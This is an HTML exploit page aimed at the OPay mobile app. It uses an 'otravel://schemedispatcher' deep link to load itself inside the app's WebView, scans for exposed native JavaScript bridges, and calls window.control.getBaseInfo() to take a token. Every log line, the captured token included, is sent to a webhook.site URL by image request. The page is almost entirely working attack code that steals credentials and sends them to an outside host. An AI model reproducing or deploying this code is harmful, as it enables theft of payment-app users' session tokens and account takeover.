<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OPay Exploit Debug</title>
    <style>
        body {
            font-family: monospace;
            padding: 20px;
            background: #eee;
            word-break: break-all;
        }

        .btn {
            display: block;
            background: #007bff;
            color: white;
            padding: 15px;
            text-align: center;
            margin: 10px 0;
            text-decoration: none;
            font-size: 18px;
            border-radius: 5px;
        }

        #log {
            background: white;
            padding: 10px;
            border: 1px solid #ccc;
            min-height: 200px;
        }
    </style>
</head>

<body>
    <h2>🕵️ Exploit Debugger</h2>

    <a id="deepLinkBtn" class="btn" href="#">🚀 Launch Deep Link</a>

    <h3>Execution Log:</h3>
    <div id="log">Waiting for execution...</div>

    <script>
        // 1. Setup Deep Link Button (retaining the fix)
        const deepLink = "otravel://schemedispatcher?action=" + window.location.href;
        document.getElementById("deepLinkBtn").href = deepLink;

        // 2. Logging Function
        function log(msg) {
            var el = document.getElementById("log");
            el.innerHTML += "<div>" + new Date().toLocaleTimeString() + ": " + msg + "</div>";
            // Also send to webhook for remote viewing
            var img = new Image();
            img.src = "https://webhook.site/669d58e9-2981-429c-b990-95b00c849bfe?log=" + encodeURIComponent(msg);
        }

        // 3. Scan for Bridge Objects
        function scan() {
            log("Scaning window properties...");
            try {
                var potentialBridges = [];
                var props = Object.getOwnPropertyNames(window);
                for (var i = 0; i < props.length; i++) {
                    var p = props[i];
                    // Filter out standard browser objects
                    if (!['window', 'self', 'document', 'name', 'location', 'customElements', 'history', 'location', 'navigation', 'navigator', 'screen', 'styleMedia', 'trustedTypes', 'performance', 'console', 'devicePixelRatio', 'external', 'localStorage', 'sessionStorage', 'indexedDB', 'webkitStorageInfo', 'caches', 'crypto', 'speechSynthesis', 'chrome'].includes(p)) {
                        try {
                            if (typeof window[p] === 'object' && window[p] !== null) {
                                potentialBridges.push(p);
                            }
                        } catch (e) { }
                    }
                }
                log("Potential Bridges Found: " + potentialBridges.join(", "));

                // 4. Try Exploit on specific known names
                if (window.control) {
                    log("SUCCESS: window.control found!");
                    if (window.control.getBaseInfo) {
                        var token = window.control.getBaseInfo();
                        log("⚠️ TOKEN FOUND: " + token);
                        alert("Token Found: " + token);
                    } else {
                        log("window.control exists but getBaseInfo is missing.");
                        // Enumerate methods
                        var methods = [];
                        for (var m in window.control) { methods.push(m); }
                        log("Methods: " + methods.join(", "));
                    }
                } else {
                    log("❌ window.control NOT found.");
                }

            } catch (e) {
                log("Error: " + e.message);
            }
        }

        // Run scan after a short delay
        setTimeout(scan, 1000);
    </script>
</body>

</html>
